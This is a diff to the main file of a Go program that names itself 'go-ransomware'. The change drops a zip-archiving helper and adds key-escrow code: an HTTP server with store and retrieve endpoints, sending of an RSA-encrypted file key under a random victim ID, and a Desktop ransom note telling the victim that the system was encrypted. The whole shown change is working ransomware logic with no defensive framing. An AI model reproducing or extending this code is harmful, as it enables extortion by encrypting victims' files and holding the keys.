@@ -3,12 +3,12 @@ package main
 import (
 	"fmt"
 	"os"
-	"io"
 	"strings"
-	"archive/zip"
+	"net/http"
 	"crypto/rand"
 	"encoding/hex"
-	"path/filepath"
+	"time"
+	"github.com/Ywern1/go-ransomware/handlers"
 	"github.com/Ywern1/go-ransomware/walker"
 	"github.com/Ywern1/go-ransomware/rsa"
 )
@@ -23,71 +23,13 @@ func GenerateKey() ([]byte, error) {
 	return Key, nil
 }
 
-func zipSource(source, archive string) error {
-	// Create a ZIP file and zip.Writer
-	f, err := os.Create(archive)
-	if err != nil {
-		return err
-	}
-	defer f.Close()
-
-	writer := zip.NewWriter(f)
-	defer writer.Close()
-
-	//Go through all the files of the source
-	filepath.Walk(source, func(path string, info os.FileInfo, err error) error {
-		if err != nil {
-			return err
-		}
-
-		//Create a local file header
-		header, err := zip.FileInfoHeader(info)
-		if err != nil {
-			return err
-		}
-
-		//set compression
-		header.Method = zip.Deflate
-
-		//Set relative path of a file as the header name
-		header.Name, err = filepath.Rel(filepath.Dir(source), path)
-		if err != nil {
-			return err
-		}
-		if info.IsDir() {
-			header.Name += "/"
-		}
-
-		//Create writer for the file header and save content of the file
-		headerWriter, err := writer.CreateHeader(header)
-		if err != nil {
-			return err
-		}
-
-		if info.IsDir() {
-			return nil
-		}
-
-		f, err := os.Open(path)
-		if err != nil {
-			return err
-		}
-		defer f.Close()
-
-		_, err = io.Copy(headerWriter, f)
-		return err
-	})
-
-	return nil
-}
-
 func main() {
-	
+
 	HomeDir, err := os.UserHomeDir()
 		if err != nil {
 			fmt.Println(err)
 		}
-		fmt.Println(HomeDir)
+	fmt.Println(HomeDir)
 
 	var input string
 
@@ -108,6 +50,22 @@ func main() {
 			fmt.Println(err)
 		}
 
+		ID := handlers.GenerateRandomString(30)
+
+		http.HandleFunc("/store", handlers.StoreKeyHandler)
+		http.HandleFunc("/retrieve", handlers.RetrieveKeyHandler)
+
+		fmt.Println("Starting server on :8080")
+
+		go func(){
+			err := http.ListenAndServe(":8080", nil)
+				if err != nil {
+			panic(err)
+		}
+		}()
+
+		time.Sleep(time.Second * 5)
+
 		cipherKey, err := rsa.EncryptRsa(EncKey)
 		if err != nil {
 			fmt.Println(err)
@@ -115,20 +73,27 @@ func main() {
 
 		// Convert the key to a hexadecimal string
 		keyStr := hex.EncodeToString(cipherKey)
+
+		handlers.SendKey(ID, keyStr)
+	
+		rsaKey, err := handlers.GetKey(ID)
+		if err != nil {
+			fmt.Println(err)
+		}
 		
 		val := `Hello
 		Your network/system was encrypted.
 		Encrypted files have new extension.
-		Your encryption key is : %s
+		Your ID is : %s
 		`
-		data := []byte(fmt.Sprintf(val, keyStr))
+		
+		data := []byte(fmt.Sprintf(val, ID))
 		
 		//drop a note to the desktop with decryption key
 		os.WriteFile(HomeDir+"/Desktop/READ_ME_TO_DECRYPT.txt", data, 0600)
 
-		if err := zipSource(walker.TempDir+"unencrypted", walker.TempDir+"unencrypted.zip"); err != nil {
-			fmt.Println(err)
-		}
+		os.WriteFile(HomeDir+"/Desktop/ID-KEY.txt", rsaKey, 0600)
+
 
 	} else if input == "d" || input == "decrypt" {
 
